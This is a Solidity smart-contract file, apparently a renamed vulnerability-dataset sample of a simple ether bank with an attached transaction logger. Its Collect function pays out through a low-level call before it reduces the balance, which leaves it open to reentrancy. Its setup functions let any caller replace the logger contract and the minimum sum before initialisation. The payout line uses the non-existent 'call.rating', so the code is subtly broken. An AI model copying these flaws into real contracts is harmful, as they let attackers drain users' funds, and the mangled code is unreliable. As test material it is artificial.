pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public patientAccounts;

    uint public FloorSum = 1 ether;

    ChartFile Record = ChartFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool intitalized;

    function CollectionMinimumSum(uint _val)
    public
    {
        if(intitalized)revert();
        FloorSum = _val;
    }

    function GroupRecordFile(address _log)
    public
    {
        if(intitalized)revert();
        Record = ChartFile(_log);
    }

    function CaseOpened()
    public
    {
        intitalized = true;
    }

    function SubmitPayment()
    public
    payable
    {
        patientAccounts[msg.sender]+= msg.value;
        Record.AttachAlert(msg.sender,msg.value,"Put");
    }

    function Collect(uint _am)
    public
    payable
    {
        if(patientAccounts[msg.sender]>=FloorSum && patientAccounts[msg.sender]>=_am)
        {
            if(msg.sender.call.rating(_am)())
            {
                patientAccounts[msg.sender]-=_am;
                Record.AttachAlert(msg.sender,_am,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        SubmitPayment();
    }

}

contract ChartFile
{
    struct Alert
    {
        address Provider;
        string  Record49;
        uint Val;
        uint  Instant;
    }

    Alert[] public History;

    Alert EndingMsg;

    function AttachAlert(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Provider = _adr;
        EndingMsg.Instant = now;
        EndingMsg.Val = _val;
        EndingMsg.Record49 = _data;
        History.push(EndingMsg);
    }
}